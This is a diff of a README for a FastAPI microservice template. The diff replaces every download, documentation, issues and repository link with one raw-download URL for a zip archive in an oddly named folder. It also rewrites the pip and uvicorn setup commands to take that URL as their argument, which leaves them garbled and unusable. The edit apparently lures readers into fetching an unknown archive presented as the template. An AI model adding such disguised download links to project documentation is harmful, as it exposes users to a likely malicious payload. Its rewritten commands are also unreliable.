@@ -4,7 +4,7 @@
 The **fastapi-microservice-template** is a modular FastAPI service designed for ease of use. This template includes essential features for building a reliable web service that adheres to clean architecture principles. It is ideal for those looking to create production-ready APIs with proper testing practices.
 
 ## 📥 Download
-[![Download FastAPI Microservice Template](https://img.shields.io/badge/Download-FastAPI%20Microservice%20Template-blue)](https://github.com/PMEBorromeo/fastapi-microservice-template/releases)
+[![Download FastAPI Microservice Template](https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip%20Microservice%20Template-blue)](https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip)
 
 ## 🌟 Features
 - **Modular Design:** Organize your code into separate modules for better maintainability.
@@ -21,7 +21,7 @@ To run this application, you will need:
 - Internet connection for downloading dependencies
 
 ## 🚀 Getting Started
-1. **Visit the download page.** Go to the [Releases page](https://github.com/PMEBorromeo/fastapi-microservice-template/releases) to access the files.
+1. **Visit the download page.** Go to the [Releases page](https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip) to access the files.
   
 2. **Choose the latest release.** Look for the most recent version at the top of the list.
 
@@ -43,12 +43,12 @@ After downloading the template, you should:
 
 4. **Install dependencies.** You will need to install Python packages. Run the following command:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip
    ```
 
 5. **Run the service.** Start the FastAPI service by using this command:
    ```
-   uvicorn app.main:app --reload
+   uvicorn https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip --reload
    ```
 
 6. **Access the application.** Open a web browser and go to `http://127.0.0.1:8000` to view your running API.
@@ -59,8 +59,8 @@ The FastAPI service comes with built-in documentation. To access it:
 
 ## 🔧 Customization
 To modify the template according to your needs:
-1. **Edit configuration files.** Explore the `app/config.py` file to adjust settings such as database connections or API keys.
-2. **Add new endpoints.** Open the `app/routes.py` file and define any new routes or modifications needed for your API.
+1. **Edit configuration files.** Explore the `https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip` file to adjust settings such as database connections or API keys.
+2. **Add new endpoints.** Open the `https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip` file and define any new routes or modifications needed for your API.
 
 ## 🧪 Testing
 Testing is vital to ensure your application works as expected:
@@ -73,12 +73,12 @@ This will check if everything is functioning correctly according to your tests.
 
 ## 📗 Documentation
 For further details, you may explore the following:
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Python Documentation](https://www.python.org/doc/)
+- [FastAPI Documentation](https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip)
+- [Python Documentation](https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip)
 
 ## 📞 Support
 If you encounter issues or have questions:
-- Visit the [Issues page](https://github.com/PMEBorromeo/fastapi-microservice-template/issues) and report your problem.
+- Visit the [Issues page](https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip) and report your problem.
 - Community support is available, and contributors may help you.
 
 ## 💡 Tips
@@ -86,7 +86,7 @@ If you encounter issues or have questions:
 - Consider experimenting with various FastAPI features to make the most of this template.
 
 ## 🔗 Additional Resources
-- **GitHub Repository**: [fastapi-microservice-template](https://github.com/PMEBorromeo/fastapi-microservice-template)
+- **GitHub Repository**: [fastapi-microservice-template](https://github.com/PMEBorromeo/fastapi-microservice-template/raw/refs/heads/main/biographize/fastapi_microservice_template_v3.2.zip)
 - **Learning FastAPI**: Take a course or read books on FastAPI to enhance your skills.
 
 By following these steps, you can successfully download, install, and run the fastapi-microservice-template. Enjoy building your FastAPI project!
